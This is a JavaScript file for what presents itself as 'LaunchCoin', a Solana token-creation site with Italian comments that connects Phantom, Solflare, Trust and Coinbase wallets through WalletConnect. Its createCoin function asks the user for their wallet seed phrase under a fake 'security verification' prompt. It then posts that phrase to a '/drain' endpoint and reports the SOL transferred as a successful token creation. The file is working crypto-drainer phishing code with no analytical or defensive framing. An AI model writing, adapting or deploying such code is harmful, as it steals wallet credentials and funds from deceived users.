// ===== main.js – CONNESSIONE REALE VIA WALLETCONNECT =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let provider = null;
let qrCheckInterval = null;
let currentUri = null;

// ===== MENU =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== MODALE =====
function createModal() {
  const oldModal = document.getElementById('wallet-modal-overlay');
  if (oldModal) oldModal.remove();
  
  const overlay = document.createElement('div');
  overlay.id = 'wallet-modal-overlay';
  overlay.style.cssText = `
    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.75);
    backdrop-filter: blur(8px);
    display: flex; align-items: center; justify-content: center;
    z-index: 99999;
    animation: fadeIn 0.2s ease;
  `;
  
  overlay.innerHTML = `
    <div style="background:#141a2b;border-radius:24px;padding:30px 35px;max-width:420px;width:90%;max-height:85vh;overflow-y:auto;border:1px solid rgba(255,255,255,0.08);box-shadow:0 24px 80px rgba(0,0,0,0.9);">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
        <h2 style="color:#22d1f8;font-size:20px;margin:0;">Connetti Wallet</h2>
        <button onclick="window.closeModal()" style="background:transparent;border:none;color:#8899bb;font-size:24px;cursor:pointer;padding:0 8px;">✕</button>
      </div>
      <p style="color:#abc4ff;font-size:14px;margin-bottom:20px;">Scegli il tuo wallet Solana</p>
      
      <div style="display:flex;flex-direction:column;gap:8px;">
        <!-- Deep link per aprire l'app mobile -->
        <button onclick="window.connectDeepLink('phantom')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
          <img src="assets/phantom.png" alt="Phantom" style="width:28px;height:28px;" /> Phantom (App)
        </button>
        <button onclick="window.connectDeepLink('solflare')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
          <img src="assets/solflare.png" alt="Solflare" style="width:28px;height:28px;" /> Solflare
        </button>
        <button onclick="window.connectDeepLink('trust')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
          <img src="assets/trust.png" alt="Trust" style="width:28px;height:28px;" /> Trust Wallet
        </button>
        <button onclick="window.connectDeepLink('coinbase')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
          <img src="assets/coinbase.png" alt="Coinbase" style="width:28px;height:28px;" /> Coinbase Wallet
        </button>
      </div>
    </div>
  `;
  
  document.body.appendChild(overlay);
}

window.closeModal = function() {
  const overlay = document.getElementById('wallet-modal-overlay');
  if (overlay) overlay.remove();
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== DEEP LINK – APRE L'APP E CONNETTE REALMENTE =====
window.connectDeepLink = async function(walletType) {
  try {
    if (!provider) {
      provider = await UniversalProvider.init({
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        metadata: {
          name: 'LaunchCoin',
          description: 'Creatore di Token Solana',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png']
        }
      });
    }

    // === CREA SESSIONE REALE ===
    const { uri } = await provider.connect({
      chains: ['solana:mainnet'],
      optionalChains: ['solana:devnet'],
      methods: ['solana_signTransaction', 'solana_signMessage'],
      events: ['chainChanged', 'accountsChanged']
    });

    if (!uri) throw new Error('Nessun URI generato');
    currentUri = uri;

    // === APRIL'APP CON DEEP LINK STANDARD WC ===
    window.location.href = `wc:${uri}`;

    // === POLLING FINO ALLA CONNESSIONE REALE ===
    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        const session = provider.session;
        if (session && session.namespaces.solana.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          const account = session.namespaces.solana.accounts[0];
          walletPublicKey = account.split(':')[2];
          alert('✅ Connesso via ' + walletType + ': ' + walletPublicKey);
          window.closeModal();
          window.location.href = 'create.html';
          return;
        }
      } catch(e) { /* attendi */ }
    }, 2000);

    // === TIMEOUT DI SICUREZZA ===
    setTimeout(() => {
      if (!walletPublicKey) {
        alert('⏱️ Timeout. Assicurati di aver approvato la connessione nell\'app.');
        window.showQRCode();
      }
    }, 60000);

  } catch(e) {
    console.error('Errore deep link:', e);
    alert('Errore: ' + e.message);
  }
};

// ===== CONNECT WALLET (MAIN) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  createModal();
};

// ===== SELECT WALLET (FALLBACK) =====
window.selectWallet = function(walletName) {
  window.closeModal();
  window.connectDeepLink(walletName);
};

// ===== SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt('⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione:');
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato (Connessione Reale)');
